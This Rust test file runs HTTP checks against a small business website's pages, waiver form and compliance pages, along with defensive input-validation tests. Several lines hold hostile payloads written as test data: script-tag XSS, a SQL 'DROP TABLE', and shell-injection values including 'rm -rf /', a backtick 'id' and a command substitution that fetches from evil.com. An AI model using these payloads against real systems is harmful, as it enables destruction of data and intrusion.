//! f30 = run_tests. HTTP-based UI/UX, feature gap, user analysis. Server must be up.

// Unlicense — cochranblock.org
// Contributors: Mattbusel (XFactor), GotEmCoach, KOVA, Claude Opus 4.6, SuperNinja, Composer 1.5, Google Gemini Pro 3

use std::time::Duration;

/// f30 = run_tests. Returns 0 if all pass, 1 otherwise.
pub async fn f30() -> i32 {
    let base = std::env::var("BASE").unwrap_or_else(|_| "http://127.0.0.1:3000".into());
    let base = base.trim_end_matches('/').to_string();

    let client = match reqwest::Client::builder()
        .timeout(Duration::from_secs(10))
        .build()
    {
        Ok(c) => c,
        Err(e) => {
            eprintln!("f30: reqwest client: {}", e);
            return 1;
        }
    };

    let mut failed = 0;
    let checks: &[(&str, &str, &[&str])] = &[
        ("home_200", "/", &[]),
        ("home_identity", "/", &["OakilyDokily", "Kaylie"]),
        ("home_serving_md", "/", &["Serving Maryland"]),
        ("home_main_landmark", "/", &["id=\"main\"", "<main"]),
        ("home_skip_link", "/", &["skip-link", "#main"]),
        ("about_200", "/about", &[]),
        ("about_resume", "/about", &["resume", "experience", "Kaylie"]),
        ("about_print", "/about", &["Print Resume", "window.print"]),
        ("contact_200", "/contact", &[]),
        ("contact_mailto", "/contact", &["mailto:"]),
        ("contact_book_call", "/contact", &["Book a Call", "Discovery"]),
        ("waiver_200", "/waiver", &[]),
        ("waiver_terms", "/waiver", &["agree_terms", "consent_electronic"]),
        ("waiver_scroll_hint", "/waiver", &["Scroll through", "scroll"]),
        ("waiver_confirmed", "/waiver/confirmed", &[]),
        ("health_200", "/health", &["OK"]),
        ("css_200", "/assets/css/main.css", &[]),
        ("favicon_200", "/assets/favicon.svg", &[]),
        ("gap_home_services", "/", &["kennel", "overnight", "surgical"]),
        ("gap_home_flexible", "/", &["Flexible", "contract", "temp"]),
        ("gap_waiver_full_name", "/waiver", &["full_name"]),
        ("gap_waiver_email", "/waiver", &["email"]),
        ("gap_nav_waiver", "/", &["Waiver", "/waiver"]),
        ("gap_nav_about", "/", &["About", "/about"]),
        ("gap_nav_contact", "/", &["Contact", "/contact"]),
        // govdocs routes
        ("govdocs_index", "/govdocs", &["Federal Compliance", "SBOM"]),
        ("govdocs_sbom", "/govdocs/sbom", &[]),
        ("govdocs_security", "/govdocs/security", &[]),
        ("govdocs_ssdf", "/govdocs/ssdf", &[]),
        ("govdocs_supply_chain", "/govdocs/supply-chain", &[]),
        ("govdocs_supply_chain_audit", "/govdocs/supply-chain-audit", &[]),
        ("govdocs_privacy", "/govdocs/privacy", &[]),
        ("govdocs_fips", "/govdocs/fips", &[]),
        ("govdocs_fedramp", "/govdocs/fedramp", &[]),
        ("govdocs_cmmc", "/govdocs/cmmc", &[]),
        ("govdocs_itar_ear", "/govdocs/itar-ear", &[]),
        ("govdocs_accessibility", "/govdocs/accessibility", &[]),
        ("govdocs_federal_use", "/govdocs/federal-use-cases", &[]),
    ];

    let client_no_redirect = reqwest::Client::builder()
        .timeout(Duration::from_secs(10))
        .redirect(reqwest::redirect::Policy::none())
        .build()
        .unwrap();

    for (name, path, patterns) in checks {
        let url = format!("{}{}", base, path);
        let client_use = if path.starts_with("/waiver") && !path.contains("confirmed") {
            &client_no_redirect
        } else {
            &client
        };
        match client_use.get(&url).send().await {
            Ok(resp) => {
                let code = resp.status().as_u16();
                let body = resp.text().await.unwrap_or_default();
                let ok = ((200..300).contains(&code)
                    && (patterns.is_empty() || patterns.iter().any(|p| body.contains(*p))))
                    || (*path == "/waiver" && patterns.is_empty() && code == 303);
                if ok {
                    println!("  [PASS] {}", name);
                } else if path.starts_with("/waiver") && !path.contains("confirmed") && code == 303 {
                    println!("  [SKIP] {} (303 auth required; set OD_TEST_WAIVER_BYPASS=1 for full waiver tests)", name);
                } else {
                    eprintln!(
                        "  [FAIL] {} (code={}, patterns={:?})",
                        name, code, patterns
                    );
                    failed += 1;
                }
            }
            Err(e) => {
                eprintln!("  [FAIL] {} (req: {})", name, e);
                failed += 1;
            }
        }
    }

    // --- adversarial input tests (POST /waiver) ---
    // Server must have OD_TEST_WAIVER_BYPASS=1 set for these to reach validation.
    let waiver_post_url = format!("{}/waiver", base);
    let adversarial_cases: &[(&str, &str, &str, &str, &[u16])] = &[
        // (name, email, xss, sig, expected_status_codes)
        // XSS in name field
        ("<script>alert(1)</script>", "x@y.com", "1", "<script>alert(1)</script>", &[400, 303]),
        // XSS in email — invalid email → 400
        ("Jane", "<script>@y.com", "1", "Jane", &[400]),
        // SQL injection in name — valid structure, should not crash
        ("'; DROP TABLE waivers;--", "x@y.com", "1", "'; DROP TABLE waivers;--", &[303, 400]),
        // Oversized name (>200 chars)
        (&"A".repeat(201), "x@y.com", "1", &"A".repeat(201), &[400]),
        // Oversized email (>254 chars)
        ("Jane", &format!("{}@y.com", "a".repeat(250)), "1", "Jane", &[400]),
        // Missing consent boxes
        ("Jane", "jane@y.com", "0", "Jane", &[400]),
        // Empty signature
        ("Jane", "jane@y.com", "1", "", &[400]),
        // Oversized signature (>200 chars)
        ("Jane", "jane@y.com", "1", &"A".repeat(201), &[400]),
    ];

    for (name, email, consent, sig, expected_codes) in adversarial_cases {
        let label = format!("adversarial_waiver name={:?} email={:?}", &name[..name.len().min(30)], &email[..email.len().min(30)]);
        let params = [
            ("full_name", *name),
            ("email", *email),
            ("consent_electronic", *consent),
            ("agree_terms", *consent),
            ("signature", *sig),
        ];
        match client_no_redirect
            .post(&waiver_post_url)
            .form(&params)
            .send()
            .await
        {
            Ok(resp) => {
                let code = resp.status().as_u16();
                if expected_codes.contains(&code) {
                    println!("  [PASS] {} (code={})", label, code);
                } else {
                    eprintln!("  [FAIL] {} (code={}, expected one of {:?})", label, code, expected_codes);
                    failed += 1;
                }
            }
            Err(e) => {
                eprintln!("  [FAIL] {} (req: {})", label, e);
                failed += 1;
            }
        }
    }

    // --- forge auth gate: unauthenticated POST /api/forge must be rejected (401) ---
    // This verifies the RCE fix: an anonymous caller cannot trigger SSH to the GPU node.
    {
        let forge_url = format!("{}/api/forge", base);
        let body = serde_json::json!({"class": "animal", "palette": "stardew", "count": 1, "steps": 1});
        match client_no_redirect.post(&forge_url).json(&body).send().await {
            Ok(resp) => {
                let code = resp.status().as_u16();
                if code == 401 {
                    println!("  [PASS] forge_requires_auth (code=401)");
                } else {
                    eprintln!("  [FAIL] forge_requires_auth (expected 401, got {})", code);
                    failed += 1;
                }
            }
            Err(e) => {
                eprintln!("  [FAIL] forge_requires_auth (req: {})", e);
                failed += 1;
            }
        }
    }

    // --- forge injection payloads: shell metacharacters in fields must not reach a shell ---
    // Sends requests with malicious class/palette values. With auth gate in place these return
    // 401 before SSH is ever invoked. The test confirms the server handles them without panic.
    {
        let forge_url = format!("{}/api/forge", base);
        let injection_cases = [
            ("injection_single_quote", "'; rm -rf /; echo '", "stardew"),
            ("injection_backtick",     "animal",              "`id`"),
            ("injection_subshell",     "$(curl evil.com)",    "stardew"),
            ("injection_newline",      "animal\nrm -rf /",    "stardew"),
        ];
        for (label, class, palette) in &injection_cases {
            let body = serde_json::json!({"class": class, "palette": palette, "count": 1, "steps": 1});
            match client_no_redirect.post(&forge_url).json(&body).send().await {
                Ok(resp) => {
                    let code = resp.status().as_u16();
                    // Must be rejected (401 auth gate) — must NOT be 500 (unhandled injection panic)
                    if code == 401 {
                        println!("  [PASS] {} (code=401, blocked at auth gate)", label);
                    } else {
                        eprintln!("  [FAIL] {} (expected 401, got {})", label, code);
                        failed += 1;
                    }
                }
                Err(e) => {
                    eprintln!("  [FAIL] {} (req: {})", label, e);
                    failed += 1;
                }
            }
        }
    }

    // --- snapshot: key page content must include expected landmarks ---
    let snapshot_checks: &[(&str, &str, &[&str])] = &[
        ("snap_home_title", "/", &["<title>", "OakilyDokily"]),
        ("snap_home_skip_nav", "/", &["skip-link", "Skip to main content"]),
        ("snap_waiver_form_fields", "/waiver", &["full_name", "email", "signature", "agree_terms", "consent_electronic"]),
        ("snap_waiver_no_xss_reflection", "/waiver", &[]),
        ("snap_about_title", "/about", &["<title>", "About"]),
        ("snap_contact_title", "/contact", &["<title>", "Contact"]),
        ("snap_health_ok", "/health", &["OK"]),
        ("snap_sitemap_xml", "/sitemap.xml", &["<urlset", "<url>"]),
    ];
    for (name, path, patterns) in snapshot_checks {
        let url = format!("{}{}", base, path);
        let use_client = if path.starts_with("/waiver") && !path.contains("confirmed") {
            &client_no_redirect
        } else {
            &client
        };
        match use_client.get(&url).send().await {
            Ok(resp) => {
                let code = resp.status().as_u16();
                let body = resp.text().await.unwrap_or_default();
                let ok = ((200..400).contains(&code))
                    && (patterns.is_empty() || patterns.iter().all(|p| body.contains(*p)));
                if ok {
                    println!("  [PASS] {}", name);
                } else {
                    eprintln!("  [FAIL] {} (code={}, missing patterns in body)", name, code);
                    failed += 1;
                }
            }
            Err(e) => {
                eprintln!("  [FAIL] {} (req: {})", name, e);
                failed += 1;
            }
        }
    }

    if failed > 0 {
        eprintln!("\n{} check(s) failed", failed);
        1
    } else {
        println!("\nall checks passed");
        0
    }
}